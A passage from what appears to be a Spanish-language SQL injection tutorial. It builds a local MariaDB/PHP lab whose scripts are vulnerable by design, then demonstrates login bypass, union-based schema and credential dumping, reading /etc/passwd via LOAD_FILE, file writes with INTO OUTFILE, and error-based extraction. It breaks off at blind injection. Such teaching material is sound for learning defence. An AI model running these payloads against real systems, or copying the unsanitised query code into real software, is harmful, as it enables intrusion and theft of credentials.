---
title: Inyecciones SQL
tags:
  - "SQLi"
categories:
  - "Explicación"
  - "SQLi"
image:
  path: /assets/img/sqli/sqlinjection.png
---

En este post aprenderemos qué son las inyecciones SQL, qué tipos existen, etc. Pero, como dice el refrán, no se empieza la casa por el tejado. Es por ello que es vital entender primero la base para poder comprender con plenitud todo lo demás.

----

## ¿Qué es SQL?

SQL, por sus siglas en inglés (**S**tructured **Q**uery **L**anguage), es un lenguaje diseñado para gestionar y manipular bases de datos relacionales. Se utiliza para realizar consultas, actualizaciones, inserciones, eliminaciones y otras operaciones relacionadas con la información en las bases de datos.

## ¿Para qué se utiliza SQL?

En el mundo actual, la gran mayoría de páginas web dependen en gran medida de bases de datos para almacenar, gestionar y mostrar información de manera eficiente. Estas bases de datos actúan como almacenes de datos fundamentales que contienen una amplia variedad de información, como perfiles de usuarios, publicaciones, comentarios, transacciones, productos y mucho más.

Detrás de cada página web dinámica que interactúa con los usuarios, hay una base de datos trabajando por detras para proporcionar la información necesaria en el momento adecuado. Es por ello que se utiliza SQL para interactuar con estas bases de datos y recuperar la información requerida.

## ¿Qué son los RDBMS?

Los RDBMS o por sus siglas en inglés (**R**elational **D**ata**B**ase **M**anagement **S**ystem) son un tipo de software que se utiliza para gestionar bases de datos relacionales. Este tipo de bases de datos almacenan datos en tablas, donde cada tabla está formada por filas y columnas, y las relaciones entre las tablas se establecen utilizando claves primarias y claves foráneas.

Los RDBMS más famosos son:

* MySQL
* MariaDB
* PostgreSQL
* Oracle
* MS SQL (Microsoft SQL)

Cada gestor de bases de datos opera bajo los modelos relacionales, sin embargo, cada uno posee carácterísticas únicas que los distinguen entre sí.

## Estructura de bases de datos

Todo lo explicado anteriormente se puede ver reflejado en el siguiente diagrama:

![img](/assets/img/sqli/estructura.png)

Con esta estructura, podemos observar de manera más clara cómo está organizado todo dentro de un gestor de bases de datos.

## Creación del laboratorio de prácticas para inyecciones SQL

Para una mejor comprensión, vamos a replicar esa estructura utilizando `MariaDB` para gestionar la base de datos, `php-mysql` para poder interactuar con la base de datos y `Apache` para poder visualizar el contenido de la misma. 

Lo primero que debemos hacer es instalar e iniciar el servicio de mysql:

```shell
sudo apt install mysql-server
```

```shell
❯ service mysql start
❯ service mysql status
● mariadb.service - MariaDB 10.5.21 database server
     Loaded: loaded (/lib/systemd/system/mariadb.service; disabled; preset: disabled)
     Active: active (running) since Tue 2024-03-19 17:52:56 CET; 1h 27min ago
       Docs: man:mariadbd(8)
             https://mariadb.com/kb/en/library/systemd/
    Process: 412567 ExecStartPre=/usr/bin/install -m 755 -o mysql -g root -d /var/run/mysqld (code=exited, status=0/SUCCESS)
    Process: 412568 ExecStartPre=/bin/sh -c systemctl unset-environment _WSREP_START_POSITION (code=exited, status=0/SUCCESS)
    Process: 412570 ExecStartPre=/bin/sh -c [ ! -e /usr/bin/galera_recovery ] && VAR= ||   VAR=`cd /usr/bin/..; /usr/bin/galera_recovery`; [ $? -eq 0 ]   && systemctl set-environment >
    Process: 412648 ExecStartPost=/bin/sh -c systemctl unset-environment _WSREP_START_POSITION (code=exited, status=0/SUCCESS)
    Process: 412650 ExecStartPost=/etc/mysql/debian-start (code=exited, status=0/SUCCESS)
   Main PID: 412618 (mariadbd)
     Status: "Taking your SQL requests now..."
      Tasks: 8 (limit: 9400)
     Memory: 115.8M
        CPU: 873ms
     CGroup: /system.slice/mariadb.service
             └─412618 /usr/sbin/mariadbd
```

Teniendo ya el servicio iniciado abrimos el MariaDB para crear la base de datos:

```shell
mysql -u root -p
```

```sql
MariaDB [(none)]> CREATE DATABASE gamesdb;
Query OK, 1 row affected (0,000 sec)

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| gamesdb            |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (0,000 sec)
```
Accedemos a la bases de datos y creamos las tablas `users` y `games` con sus respectivas columnas:

```sql
MariaDB [(none)]> use gamesdb;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [gamesdb]> create table games(id int(10), games varchar(32), release_date date);
Query OK, 0 rows affected (0,015 sec)

MariaDB [gamesdb]> describe games;
+--------------+-------------+------+-----+---------+-------+
| Field        | Type        | Null | Key | Default | Extra |
+--------------+-------------+------+-----+---------+-------+
| id           | int(10)     | YES  |     | NULL    |       |
| games        | varchar(32) | YES  |     | NULL    |       |
| release_date | date        | YES  |     | NULL    |       |
+--------------+-------------+------+-----+---------+-------+
3 rows in set (0,001 sec)

MariaDB [gamesdb]> create table users(id int(10),username varchar(32),password varchar(32));
Query OK, 0 rows affected (0,016 sec)

MariaDB [gamesdb]> describe users;
+----------+-------------+------+-----+---------+-------+
| Field    | Type        | Null | Key | Default | Extra |
+----------+-------------+------+-----+---------+-------+
| id       | int(10)     | YES  |     | NULL    |       |
| username | varchar(32) | YES  |     | NULL    |       |
| password | varchar(32) | YES  |     | NULL    |       |
+----------+-------------+------+-----+---------+-------+
3 rows in set (0,001 sec)

```

Añadimos los datos:

```sql
MariaDB [gamesdb]> INSERT INTO games (id, games, release_date) VALUES
  ('1', 'Warframe', '2013-03-25'),
  ('2', 'Dead By Daylight', '2016-06-14'),
  ('3', 'Cult Of The Lamb', '2022-06-10'),
  ('4', 'The Forest', '2014-05-03'),
  ('5', 'Aragami', '2016-10-04');
Query OK, 5 rows affected (0,002 sec)
Records: 5  Duplicates: 0  Warnings: 0

MariaDB [clientsdb]> INSERT INTO users (id, username, password) VALUES
  ('1', 'V1c3nt_123', 'password123!'),
  ('2', '1s4-4c', '1s4g11il@r!'),
  ('3', 'R_J04qu1n_R', 'R0j0_123'),
  ('4', '4my-C4ts', 'L0v3_C4t2'),
  ('5', 'K1ll_DBD', 'M41n_N11r23');
Query OK, 5 rows affected (0,003 sec)
Records: 5  Duplicates: 0  Warnings: 0
```

La consulta mas basica que se puede ralizar es la siguiente `select  * from users` en la cual se le esta diciendo lo siguiente: "seleccioname todo el contenido de la tabla `users`".

```sql
MariaDB [clientsdb]> select * from users;
+------+-------------+---------------+
| id   | username    | password      |
+------+-------------+---------------+
|    1 | V1c3nt_123  | password123!  |
|    2 | 1s4-4c      | 1s4g11il@r!   |
|    3 | R_J04qu1n_R | R0j0_123      |
|    4 | 4my-C4ts    | L0v3_C4t2     |
|    5 | K1ll_DBD    | M41n_N11r23   |
+------+-------------+---------------+
5 rows in set (0,000 sec)
```

Esta seria otro tipo de sentencia:

```sql
select * from users where id = '1';
+------+------------+---------------+
| id   | username   | password      |
+------+------------+---------------+
|    1 | V1c3nt_123 | password123!  |
+------+------------+---------------+
1 row in set (0,000 sec)
```

En esta se le esta indicando que seleccione todos los datos de la tabla `users` DONDE el ID sea igual a 1.

Esto seria lo mismo que poner lo anterior:

```sql
select id, username, password from users where username = 'V1c3nt_123';
+------+------------+---------------+
| id   | username   | password      |
+------+------------+---------------+
|    1 | V1c3nt_123 | password123!  |
+------+------------+---------------+
1 row in set (0,000 sec)
```

### SQL en páginas web

Ahora que tenemos la base de datos creada, crearemos el script PHP que servirá para conectarse y consultar la base de datos.

Pero antes de crear el script debemos primero crear un usuario con los privilegios necesarios para poder conectarse a la base de datos.

Creamos el usuario:

```sql
MariaDB [(none)]> create user 'pr1ngl3s'@'%' IDENTIFIED BY 'pringles123';
Query OK, 0 rows affected (0,002 sec)
```

Y le damos los privilegios necesarios para poder conectarse:


```sql
MariaDB [(none)]> grant all privileges on *.* to 'pr1ngl3s'@'%' with grant option;
Query OK, 0 rows affected (0,002 sec)

MariaDB [(none)]> flush privileges;
Query OK, 0 rows affected (0,000 sec)
```

Instalamos `php-mysql` y los paquetes necesarios para poder correr PHP:

```shell
sudo apt install php-mysql 
sudo apt install php libapache2-mod-php
```

Instalamos, e iniciamos el servicio de apache:

```shell
sudo apt install apache2 
```

```shell
❯ service apache2 start
❯ service apache2 status
● apache2.service - The Apache HTTP Server
     Loaded: loaded (/lib/systemd/system/apache2.service; enabled; preset: disabled)
     Active: active (running) since Tue 2024-03-19 08:32:44 CET; 10h ago
       Docs: https://httpd.apache.org/docs/2.4/
    Process: 1012 ExecStart=/usr/sbin/apachectl start (code=exited, status=0/SUCCESS)
   Main PID: 1154 (apache2)
      Tasks: 7 (limit: 9400)
     Memory: 19.0M
        CPU: 1.661s
     CGroup: /system.slice/apache2.service
             ├─  1154 /usr/sbin/apache2 -k start
             ├─  1172 /usr/sbin/apache2 -k start
             ├─  1173 /usr/sbin/apache2 -k start
             ├─  1174 /usr/sbin/apache2 -k start
             ├─  1175 /usr/sbin/apache2 -k start
             ├─  1176 /usr/sbin/apache2 -k start
             └─306517 /usr/sbin/apache2 -k start

mar 19 08:32:44 parrot systemd[1]: Starting apache2.service - The Apache HTTP Server...
mar 19 08:32:44 parrot apachectl[1056]: AH00558: apache2: Could not reliably determine the server's fully qualified domain name, using 127.0.1.1. Set the 'ServerName' directive global>
mar 19 08:32:44 parrot systemd[1]: Started apache2.service - The Apache HTTP Server.
```

Y finalmente creamos el script PHP que nos permitira conectarnos a la bases de datos:

```php
<?php
  $server = "localhost";
  $username = "pr1ngl3s";
  $password = "pringles123";
  $database = "gamesdb";


  // Creamos una nueva conexión a la base de datos utilizando MySQLi
  $conn = new mysqli($server, $username, $password, $database);


  // Verificamos si se ha proporcionado un parámetro 'id' a través de la URL
  $id = $_GET['id'];

  // Realizamos un consulta SQL para obtener el nombre del articulo  y su fecha de lanzamiento correspondiente al ID y manejar cualquier error en caso de que ocurra
  $query = mysqli_query($conn, "SELECT games,release_date FROM games WHERE id='$id'") or die(mysqli_error($conn));

  // Obtenemos el resultado de la consulta
  $response = mysqli_fetch_array($query);

  // Mostramos el resultado de de la columna 'games' correspondiente al ID
  echo "Juego: " . $response['games'] . "<br><br>";
  // Mostramos el resultado de de la columna 'release_date' correspondiente al ID
  echo "Fecha de lanzamiento: " . $response['release_date'];
?>

```

Ahora al acceder a la web y añadir el id del producto, ya nos muestra la información de este.

![img](/assets/img/sqli/test_mysql.png)

Con todos estos pasos completados y conceptos aprendidos, ahora estamos listos para avanzar en el tema de las inyecciones SQL.

## Inyecciones SQL

Las inyecciones SQL son una vulnerabilidad de seguridad que se produce cuando un usuario malintencionado aprovecha la falta de validación o filtrado de datos en una aplicación web para insertar código SQL malicioso en los campos de entrada, lo que le permite acceder a datos sensibles. 

Esto puede llevar a una serie de problemas, como la obtención no autorizada de información confidencial, la modificación o eliminación de datos en la base de datos, e incluso ejecutar comandos, dependiendo de la gravedad de la vulnerabilidad y de los privilegios otorgados al usuario malintencionado.

### Conceptos de inyecciones SQL

Una forma común de detectar una inyección SQL es insertar una comilla y observar si el servidor muestra algún mensaje de error.

![img](/assets/img/sqli/image0.png)

Digamos que queremos hacer una consulta a la tabla `users` correspondiente al ID que pongamos:

![img](/assets/img/sqli/1.png)

Pero que pasaría ahora si además del número 1 o el valor que sea, añadimos una sentencia SQL como la siguiente:

![img](/assets/img/sqli/2.png)

En esta consulta, inicialmente se muestra el usuario con su respectivo ID. Sin embargo, se ha añadido una condición adicional, `or 1=1`, que garantiza que esta condición sea siempre verdadera. Esto significa que la consulta devolverá todos los nombres de usuario en la tabla "users", ignorando cualquier otra condición que pueda haber en la consulta original, debido a la operatoria del `OR`.

![img](/assets/img/sqli/image2.png)

Pero antes de seguir voy a explicar por que estoy utilizando una comilla `'` y un comentario `-- -` en la inyección. 

Esto se debe a que si colocamos directamente la condición `or 1=1`, la consulta no la interpretará correctamente, ya que se encuentra dentro de las comillas utilizadas para encapsular los valores en la consulta.

![img](/assets/img/sqli/image3.png)

Al añadir la comilla, garantizamos que la condición se interprete correctamente. Sin embargo, esto puede dejar una comilla sin cerrar, por lo que agregamos el signo `-- -` para comentar el resto de la consulta y evitar posibles errores de sintaxis.

![img](/assets/img/sqli/image4.png)

Un ejemplo para entender esto seria con un panel de login, digamos que tenemos uno el cual para acceder necesitamos ingresar el nombre de usuario y la contraseña.

```php
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Panel de Login</title>
</head>
<body>
    <h2>Panel de Login</h2>
    <form method="post">
        <label>Usuario:</label>
        <input type="text" name="user" required><br><br>
        <label>Contraseña:</label>
        <input name="pass" required><br><br>
        <button type="submit">Enter</button><br><br>
    </form>
</body>
</html>
<?php
    $server = "localhost";
    $username = "pr1ngl3s";
    $password = "pringles123";
    $database = "gamesdb";

  // Realiza la conexión a la base de datos
    $conn = new mysqli($server, $username, $password, $database);

    // Guarda los datos enviados por el formulario a través del método POST
    $user = $_POST['user'];
    $pass = $_POST['pass'];

    // Realiza una consulta SQL para verificar las credenciales del usuario ingresado
    $query = mysqli_query($conn, "SELECT username FROM users WHERE username='$user' AND password='$pass'") or die(mysqli_error($conn));

    $response = mysqli_fetch_array($query);

    // Comprueba si se ha enviado el formulario
    if ($_SERVER["REQUEST_METHOD"] == "POST"){
      // Comprueba si se encontró un usuario con las credenciales proporcionadas
      if($response) {
          echo "El usuario $user existe";
      } else {
        echo "El usuario o la contraseña son incorrectos";
      }
    }
?>
```

Al acceder al panel de inicio de sesión, se nos mostraría tal que así:

![img](/assets/img/sqli/image5.png)

Supongamos que no conocemos la contraseña pero si el nombre de usuario y deseamos acceder de todos modos. Una forma de lograrlo es comentar el resto de la consulta SQL, dejando únicamente `SELECT username FROM users WHERE username='1s4-4c'`. En esta sentencia, al buscar únicamente por el nombre de usuario lo tomara como valido.

![img](/assets/img/sqli/image6.png)

![img](/assets/img/sqli/image7.png)

![img](/assets/img/sqli/image8.png)

En el caso de que no se conozca tampoco el nombre de usuario tambien funcionaria añadiendo lo siguiente:

![img](/assets/img/sqli/unknown_username.png)

![img](/assets/img/sqli/unknown_username2.png)


Un punto notable para resaltar es que, en presencia de dos operaciones lógicas, tanto `AND` como `OR`, se realizará primero la operación `AND` y luego la operación `OR`. 

![img](/assets/img/sqli/operatoria.png)

Por ello, al enviar los datos siguientes, se considera válido, dado que la sentencia final resulta en `TRUE`.

![img](/assets/img/sqli/image9.png)

![img](/assets/img/sqli/image10.png)

A continuación, se proporcionan unas tablas que explican de manera más clara la lógica de los operandos `AND` y `OR`.


| Condición_1  | Operador  |Condición_2   |Resultado   |
| :------------: | :------------: | :------------: | :------------: |
| FALSE  | **AND**   | FALSE  | FALSE  |
| TRUE  | **AND**  | FALSE  | FALSE  |
| FALSE  | **AND**  | TRUE  | FALSE  |
| TRUE  | **AND** | TRUE | TRUE |

| Condición_1  | Operador  |Condición_2   |Resultado   |
| :------------: | :------------: | :------------: | :------------: |
| FALSE  | **OR**  | FALSE  | FALSE  |
|TRUE | **OR**  | FALSE | TRUE  |
| FALSE  | **OR**  | TRUE  | TRUE  |
| TRUE  | **OR**  | TRUE  |  TRUE |


Cabe destacar que en estos ejemplos hemos utilizado la comilla simple `'` y el signo de comentario `-- -`, pero esto puede variar dependiendo de la sintaxis de la sentencia y del sistema de gestión de bases de datos (RDBMS).

* Con el signo `#` también se pueden crear comentarios.
* Cuando se utilizan guiones `--`, se añade un espacio al final, evitando así que el comentario se adhiera directamente a otro elemento sin espacio entre ellos, y para destacarlo, se incluye otro guion adicional `-- -`.

## Tipos de Inyecciones SQL

Tras haber revisado los conceptos de inyecciones SQL, ahora nos adentraremos en la explicación de los distintos tipos que existen.

![img](/assets/img/sqli/diagrama.png)

Existen 3 tipos de inyecciones SQL:

1. **In-band**: La salida de la consulta se obtiene a través del propio front-end de la página.

     * **Union**: La basada en union utiliza la orden ``UNION`` para combinar los resultados de dos o más consultas SELECT en un único conjunto de resultados.
     * **Error**: La inyección basada en errores permite la extracción de información de la base de datos mediante el añadido de errores a propósito en las consultas SQL.
2. **Blind**: La información no se muestra directamente en el front-end. En su lugar, se utilizara la lógica de SQL para obtener la información deseada carácter por carácter.
   
   * **Boolean**: La información se obtiene a través de la respuesta booleana (True o False) de la página web.
   * **Time**: La información se obtiene mediante el tiempo de carga de la pagina.
3. **Out-of-band**: La información no se recibe a través del canal de comunicación principal, sino que se redirige hacia solicitudes DNS, peticiones HTTP(S) u otros medios alternativos.
 
## In-Band
Este tipo de inyección es el más sencillo de entender, ya que, como mencioné anteriormente, la información se puede obtener directamente a través de la propia página web. Se divide en dos tipos principales: `UNION` y `ERROR`.

### Union-based

Las inyecciones SQL basadas en unión utilizan la condición `UNION` que es la que vamos a utilizar para este tipo de inyección, la cual combina los resultados de las consultas SELECT dentro de la tabla principal.

```sql
MariaDB [gamesdb]> select games,release_date from games union select username,password from users;
+------------------+--------------+
| games            | release_date |
+------------------+--------------+
| Warframe         | 2013-03-25   |
| Dead By Daylight | 2016-06-14   |
| Cult Of The Lamb | 2022-06-10   |
| The Forest       | 2014-05-03   |
| Aragami          | 2016-10-04   |
| V1c3nt_123       | password123! |
| 1s4-4c           | 1s4g11il@r!  |
| R_J04qu1n_R      | R0j0_123     |
| 4my-C4ts         | L0v3_C4t2    |
| K1ll_DBD         | M41n_N11r23  |
+------------------+--------------+
10 rows in set (0,000 sec)
```

Cabe destacar que, para realizar la unión, ambas tablas en la consulta deben tener el mismo número de columnas, por lo que es necesario conocer esta cantidad en la tabla principal.

Por lo que antes seguir con la instrucción `UNION` primero hay que conocer el numero de columnas que hay en una query, esto se puede conseguir utilizando la instrucción `ORDER BY`.


La instrucción `ORDER BY` nos sirve para realizar un ordenamiento de la columna que nosotros indiquemos.

```sql
MariaDB [gamesdb]> select games,release_date from games order by 1;
+------------------+--------------+
| games            | release_date |
+------------------+--------------+
| Aragami          | 2016-10-04   |
| Cult Of The Lamb | 2022-06-10   |
| Dead By Daylight | 2016-06-14   |
| The Forest       | 2014-05-03   |
| Warframe         | 2013-03-25   |
+------------------+--------------+
5 rows in set (0,001 sec)

MariaDB [gamesdb]> select games,release_date from games order by 2;
+------------------+--------------+
| games            | release_date |
+------------------+--------------+
| Warframe         | 2013-03-25   |
| The Forest       | 2014-05-03   |
| Dead By Daylight | 2016-06-14   |
| Aragami          | 2016-10-04   |
| Cult Of The Lamb | 2022-06-10   |
+------------------+--------------+
5 rows in set (0,000 sec)
```
![img](/assets/img/sqli/orderby1.png)

![img](/assets/img/sqli/orderby2.png)




No obstante si la columna a la cual queremos hacer el ordenamiento no existe, nos mostrara algo como esto:


![img](/assets/img/sqli/orderby3.png)


Con ese mensaje recibido ya nos podemos dar a la idea de que el numero de columnas que tiene la query son 2.

Teniendo ya conocido el número de columnas que tiene la consulta, ya podemos proceder a utilizar la instrucción `UNION` para añadir los datos que deseemos.

Sin embargo, al agregar los datos, no se muestran de inmediato. Esto se debe a que primero se están mostrando los datos del producto al que se le ha asociado el ID.

![img](/assets/img/sqli/union_test.png)

Para que los datos que añadimos se muestren, simplemente eliminamos el ID y ya.

![img](/assets/img/sqli/union_test2.png)

Ahora que los datos han sido mostrados, es allí donde se nos mostrara toda la información que queramos, el siguiente paso es enumerar el contenido de la base de datos. Sin embargo, si no tenemos conocimientos sobre el número de bases de datos, sus nombres, etc, una de las instrucciones que utilizaremos será `database()`, la cual nos permite obtener el nombre de la base de datos y `@@version`, con la cual podemos ver la versión del software del gestor de bases de datos que se está utilizando.

![img](/assets/img/sqli/database()_version.png)


Con la instrucción `user()` podemos ver el nombre del usuario que esta conectado a la base de datos.

![img](/assets/img/sqli/user_name.png)

Estas instrucciones pueden variar dependiendo del gestor de bases de datos que se esté utilizando.

El siguiente paso es descubrir todas las bases de datos existentes. Para lograrlo, primero debemos tener en cuenta que la mayoría de los gestores de bases de datos almacenan información sobre estas en ciertas bases específicas. Por ejemplo, en `MySQL` y `MariaDB`, esta información se encuentra en la base de datos `information_schema`.

Sabiendo que toda la informacion de todas las bases de datos se encuentran en la base `information_schema` ahora toca saber el nombre de estas, para ello tenemos que saber que todas las bases de datos se guardan en la columna `schema_name` de  la tabla `schemata` y al ser otra base de datos en la que nos encontramos hay que especificar tambien el nombre de esta separado por un punto `[database_name].[table_name]`.

```sql
MariaDB [gamesdb]> select schema_name from information_schema.schemata;
+--------------------+
| schema_name        |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| gamesdb            |
+--------------------+
4 rows in set (0,000 sec)
```

Quedando la query final tal que así.

![img](/assets/img/sqli/schema_name.png)

Pero hay un problema y es que solo muestra la primera fila de la consulta, si quisieramos poder ver todos los elementos hay 2 formas de lograr eso.

Una de ellas es con la instrucción `LIMIT` que nos permite especificar el número máximo de filas que deseemos que se muestren en el resultado de la consulta.

```sql
MariaDB [gamesdb]> select schema_name from information_schema.schemata LIMIT 1;
+--------------------+
| schema_name        |
+--------------------+
| information_schema |
+--------------------+
1 row in set (0,000 sec)

MariaDB [gamesdb]> select schema_name from information_schema.schemata LIMIT 2;
+--------------------+
| schema_name        |
+--------------------+
| information_schema |
| mysql              |
+--------------------+
2 rows in set (0,000 sec)
```

También se puede agregar otro valor que indique el punto de inicio desde el cual queremos que comience la limitación de filas, utilizando la sintaxis `LIMIT [Inicio], [Cantidad de filas a mostrar]`, la primera fila empieza por 0 la segunda por 1 etc.

```sql
MariaDB [gamesdb]> select schema_name from information_schema.schemata LIMIT 0,2;
+--------------------+
| schema_name        |
+--------------------+
| information_schema |
| mysql              |
+--------------------+
2 rows in set (0,000 sec)

MariaDB [gamesdb]> select schema_name from information_schema.schemata LIMIT 1,2;
+--------------------+
| schema_name        |
+--------------------+
| mysql              |
| performance_schema |
+--------------------+
2 rows in set (0,000 sec)

MariaDB [gamesdb]> select schema_name from information_schema.schemata LIMIT 2,2;
+--------------------+
| schema_name        |
+--------------------+
| performance_schema |
| gamesdb            |
+--------------------+
2 rows in set (0,000 sec)
```

Quedando la query final tal que así:

![img](/assets/img/sqli/limit0.png)

![img](/assets/img/sqli/limit1.png)

![img](/assets/img/sqli/limit2.png)

![img](/assets/img/sqli/limit3.png)

El otro metodo es con `GROUP_CONCAT()`, que concatena toda la información en una única fila.

```sql
MariaDB [gamesdb]> select group_concat(schema_name) from information_schema.schemata;
+-----------------------------------------------------+
| group_concat(schema_name)                           |
+-----------------------------------------------------+
| information_schema,mysql,performance_schema,gamesdb |
+-----------------------------------------------------+
1 row in set (0,000 sec)
```

![img](/assets/img/sqli/group_concat.png)

Teniendo ya los nombre de las bases de datos, veamos las tablas que contiene la base de datos llamada `gamesdb`, los nombres de las tabla se guardan en la columna `table_name` de la tabla `tables` pero cabe resaltar que si añadimos directamente la query así, nos mostrara todas las tablas de todas las bases de datos.

```sql
MariaDB [(none)]> select table_name from information_schema.tables;
+------------------------------------------------------+
| table_name                                           |
+------------------------------------------------------+
| ALL_PLUGINS                                          |
| APPLICABLE_ROLES                                     |
| CHARACTER_SETS                                       |
| CHECK_CONSTRAINTS                                    |
| COLLATIONS                                           |
| COLLATION_CHARACTER_SET_APPLICABILITY                |
| COLUMNS                                              |
| COLUMN_PRIVILEGES                                    |
| ENABLED_ROLES                                        |
| ENGINES                                              |
| EVENTS                                               |
| FILES                                                |
| GLOBAL_STATUS                                        |
| GLOBAL_VARIABLES                                     |
| KEYWORDS                                             |
| KEY_CACHES                                           |
| KEY_COLUMN_USAGE                                     |
```

Es por ello que hay que indicar la base de datos a la cual se  quiere acceder, la cual se guarda en la columna `table_schema` quedando la query final de la siguiente manera `' union select group_concat(table_name),2 from information_schema.tables where table_schema='gamesdb'-- -`.

```sql
MariaDB [(none)]> select table_name,table_schema from information_schema.tables where table_schema='gamesdb';
+------------+--------------+
| table_name | table_schema |
+------------+--------------+
| users      | gamesdb      |
| games      | gamesdb      |
+------------+--------------+
2 rows in set (0,000 sec)
```

![img](/assets/img/sqli/table_name.png)

Ahora sabemos que hay una tabla con el nombre `users` que llama mucho la atención. Teniendo esta información, ahora habría que conocer las columnas de dicha tabla. Para ello, habría que mirar la columna `column_name` de la tabla `columns`, que es donde se guardan todas las columnas de todas las tablas de todas las bases de datos. Es por ello que, nuevamente, hay que filtrar no solo por la base de datos sino también por la tabla a la cual se quiere acceder, quedando la consulta tal que así `' union select group_concat(column_name),2 from information_schema.columns where table_schema='gamesdb' and table_name='users'-- -`. 

```sql
MariaDB [gamesdb]> select column_name from information_schema.columns where table_schema='gamesdb' and table_name='users';
+-------------+
| column_name |
+-------------+
| id          |
| username    |
| password    |
+-------------+
3 rows in set (0,001 sec)
```

![img](/assets/img/sqli/column_name.png)

Ya conociendo el nombres de las columnas, el siguiente paso sería ver los datos que contienen. Simplemente seleccionaríamos los datos de las columnas y los concatenaríamos con dos puntos para una mejor distinción. (0x3a representa ':' en hexadecimal).

![img](/assets/img/sqli/select_us_pass.png)

En caso de que se esté utilizando `LIMIT`, se podría emplear la función `CONCAT()` para concatenar las columnas en una sola.

```sql
MariaDB [gamesdb]> select concat(username,':',password) from users;
+-------------------------------+
| concat(username,':',password) |
+-------------------------------+
| V1c3nt_123:password123!       |
| 1s4-4c:1s4g11il@r!            |
| R_J04qu1n_R:R0j0_123          |
| 4my-C4ts:L0v3_C4t2            |
| K1ll_DBD:M41n_N11r23          |
+-------------------------------+
5 rows in set (0,000 sec)

MariaDB [gamesdb]> select concat(username,':',password) from users limit 0,1;
+-------------------------------+
| concat(username,':',password) |
+-------------------------------+
| V1c3nt_123:password123!       |
+-------------------------------+
1 row in set (0,000 sec)
```

![img](/assets/img/sqli/concat1.png)

![img](/assets/img/sqli/concat2.png)

![img](/assets/img/sqli/concat3.png)

![img](/assets/img/sqli/concat4.png)

![img](/assets/img/sqli/concat5.png)

Una vez que hemos descubierto toda la base de datos junto con todos sus datos, podría parecer que todo termina aquí, pero no es así. Además de la información que podemos encontrar, también podemos leer e incluso crear archivos dentro del sistema.

En el caso de la lectura de archivos primero abria que verificar si el usuario que esta conectado a la base de datos tiene el privilegio `FILE`. Para revisar los privilegios de todos los usuarios, se puede acceder a la tabla `user_privileges` dentro de la base de datos `information_schema`, donde la columna `privilege_type` almacena los distintos privilegios asignados.

```sql
MariaDB [(none)]> select * from information_schema.user_privileges;
+---------------------------+---------------+--------------------------+--------------+
| GRANTEE                   | TABLE_CATALOG | PRIVILEGE_TYPE           | IS_GRANTABLE |
+---------------------------+---------------+--------------------------+--------------+
| 'empire_user'@'localhost' | def           | SELECT                   | YES          |
| 'empire_user'@'localhost' | def           | INSERT                   | YES          |
| 'empire_user'@'localhost' | def           | UPDATE                   | YES          |
| 'empire_user'@'localhost' | def           | DELETE                   | YES          |
| 'empire_user'@'localhost' | def           | CREATE                   | YES          |
| 'empire_user'@'localhost' | def           | DROP                     | YES          |
| 'empire_user'@'localhost' | def           | RELOAD                   | YES          |
| 'empire_user'@'localhost' | def           | SHUTDOWN                 | YES          |
| 'empire_user'@'localhost' | def           | PROCESS                  | YES          |
| 'empire_user'@'localhost' | def           | FILE                     | YES          |
```

En este caso filtrar por los usuario que tengan el privilegio `FILE`.

```sql
MariaDB [(none)]> select grantee,privilege_type from information_schema.user_privileges where privilege_type='FILE';
+---------------------------+----------------+
| grantee                   | privilege_type |
+---------------------------+----------------+
| 'empire_user'@'localhost' | FILE           |
| 'mysql'@'localhost'       | FILE           |
| 'pr1ngl3s'@'%'            | FILE           |
| 'root'@'localhost'        | FILE           |
+---------------------------+----------------+
4 rows in set (0,000 sec)
```

![img](/assets/img/sqli/privilege_file.png)


Ya sabiendo que tenemos el privilegio `FILE` podemos tratar de leer el contenido de algun archivo del sistema, en este caso probamos con el `/etc/passwd` para ello utilizaremos la función `LOAD_FILE` que nos permite cargar el contenido de un archivo de texto.

![img](/assets/img/sqli/load_file.png)

Seguido de la lectura de archivos tenemos la posibilidad de poder escribir en ellos, para ello se necesitan 3 cosas:

1. Permiso `FILE` habilitado.
2. Permisos de escritura en la ruta a la cual se quiere escribir.
3. Tener la variable `SECURE_FILE_PRIV` deshabilitada.

Para visualizar las variables existentes, se almacenan en la tabla `global_variables` dentro de la base de datos `information_schema`.

```sql
MariaDB [(none)]> select * from information_schema.global_variables where variable_name='secure_file_priv';
+------------------+----------------+
| VARIABLE_NAME    | VARIABLE_VALUE |
+------------------+----------------+
| SECURE_FILE_PRIV |                |
+------------------+----------------+
1 row in set (0,000 sec)
```
![img](/assets/img/sqli/secure_file_priv.png)

Viendo que la variable no tiene ninguna valor asignado, tenemos permisos de escritura y lectura desde cualquier parte del sistema, siempre y cuando la ruta a la que se quiera modifcar tenga los permisos de escritura necesarios, sabiendo ahora esto procederemos a utilizar la instrucción `INTO OUTFILE` quedando la query así `' union select "Credentials:",(select group_concat(username,0x3a,password) from users) INTO OUTFILE "/tmp/test.txt"-- -`.

![img](/assets/img/sqli/writing_file.png)

![img](/assets/img/sqli/reading_file.png)

### Error-based

Las inyecciones SQL basadas en errores consisten en provocar intencionalmente un error de tal manera que, al ocurrir, se obtenga información de la base de datos.

Hay multitud de formas de generar un error,y cambian dependiendo del gestor de bases de datos, pero en este caso solo veremos una de ellas la cual es con `ExtractValue()` siendo la sentencia de esta forma `1'AND ExtractValue('', CONCAT('=',([SENTENCIA SQL])))`.

![img](/assets/img/sqli/extractvalue.png)

Si quiseramos obtener los datos de las columnas estariamos limitado ya que solo podemos conseguir una columna por consulta SELECT, pero devido a que estamos utilizando la función `CONCAT` podemos añadir mas consultas SELECT `1'AND ExtractValue('', concat('=',(SELECT username from users LIMIT 0,1),':',(SELECT password from users LIMIT 0,1)))-- -`.

![img](/assets/img/sqli/extractvalue2.png)

## Blind

Hemos presenciado la capacidad de las inyecciones In-band para acceder a información de la base de datos directamente desde la página web. Sin embargo, hay casos en los que el servidor no devuelve absolutamente nada, pero aún así sigue siendo vulnerable a la inyección SQL. Estas situaciones se conocen como blind injections o inyecciones a ciegas. Se divide en dos tipos principales: `BOOLEAN` y `TIME`.

### Boolean-based

